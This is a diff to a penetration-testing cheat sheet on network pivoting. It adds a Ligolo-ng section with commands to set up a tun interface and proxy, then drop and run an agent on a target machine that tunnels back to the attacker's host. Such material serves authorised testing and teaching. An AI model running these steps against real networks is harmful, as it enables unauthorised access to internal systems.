@@ -16,30 +16,50 @@ It is inspired by the following:
 ## Summary
 
 - [Summary](#summary)
+- [Ligolo-ng](#ligolo-ng)
+	- [Setting up ligolo-NG](#setting-up-ligolo-ng)
 - [SSH Local Port Forwarding](#ssh-local-port-forwarding)
 - [SSH Remote Port Forwarding](#ssh-remote-port-forwarding)
 - [Proxychains](#proxychains)
-  - [Configure proxychains.conf (attacker's machine)](#configure-proxychainsconf-attackers-machine)
-  - [Dynamic port forwarding via ssh](#dynamic-port-forwarding-via-ssh)
+	- [Configure proxychains.conf (attacker's machine)](#configure-proxychainsconf-attackers-machine)
+	- [Dynamic port forwarding via ssh](#dynamic-port-forwarding-via-ssh)
 - [Sshuttle](#sshuttle)
 - [Redsocks](#redsocks)
-  - [Configure redsocks.conf](#configure-redsocksconf)
-  - [Configure iptables](#configure-iptables)
-  - [Dynamic ssh port](#dynamic-ssh-port)
-  - [Execute redsocks](#execute-redsocks)
+	- [Configure redsocks.conf](#configure-redsocksconf)
+	- [Configure iptables](#configure-iptables)
+	- [Dynamic ssh port](#dynamic-ssh-port)
+	- [Execute redsocks](#execute-redsocks)
 - [Plink](#plink)
-  - [Remote Tunnel](#remote-tunnel)
-  - [Local Tunnel](#local-tunnel)
-  - [Plink Troubleshooting](#plink-troubleshooting)
+	- [Remote Tunnel](#remote-tunnel)
+	- [Local Tunnel](#local-tunnel)
+	- [Plink Troubleshooting](#plink-troubleshooting)
 - [Chisel](#chisel)
-  - [Chisel Tunneling](#chisel-tunneling)
-  - [Chisel Port Forwarding](#chisel-port-forwarding)
+	- [Chisel Tunneling](#chisel-tunneling)
+	- [Chisel Port Forwarding](#chisel-port-forwarding)
 - [Socat](#socat)
-  - [Socat Port Forwarding](#socat-port-forwarding)
+	- [Socat Port Forwarding](#socat-port-forwarding)
 - [Metasploit](#metasploit)
-  - [Meterpreter Local Port Forwarding](#meterpreter-local-port-forwarding)
+	- [Meterpreter Local Port Forwarding](#meterpreter-local-port-forwarding)
 - [Stunnel](#stunnel)
-  - [Tunnel Plaintext Connections Through TLS](#tunnel-plaintext-connections-through-tls)
+	- [Tunnel Plaintext Connections Through TLS](#tunnel-plaintext-connections-through-tls)
+
+## Ligolo-ng
+
+### Setting up ligolo-NG
+
+To initiate activation, execute the prescribed sequence of commands as follows:
+```bash
+ip tuntap add user root mode tun ligolo
+ip link set ligolo up
+```
+
+Verify Ligolo-Ng activation with: `ifconfig` command. Now download and extract ligolo-ng `tar -xvzf ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz`. Among the extracted files you'll find a binary called `proxy`. The chosen approach involves utilizing the `-selfcert` option, which 
+operates on port 11601. It's recommended to either use Let's Encrypt or a self signed certificate. Execute the provided command `./proxy -selfcert` to get the proxy started. 
+
+Now transfer the agent to the target machine (updog or simple http server from Python). Now run on the target machine `./agent.exe -connect <ip of the machine running the proxy>:11601 -ignore-cert` to establish the connection over yo the proxy. After that you should see that an Agent joined.  Now you can run on the proxy the command `session` to establish the session and `start` and all should be set up to use the tunnel. 
+
+
+
 
 ## SSH Local Port Forwarding
 
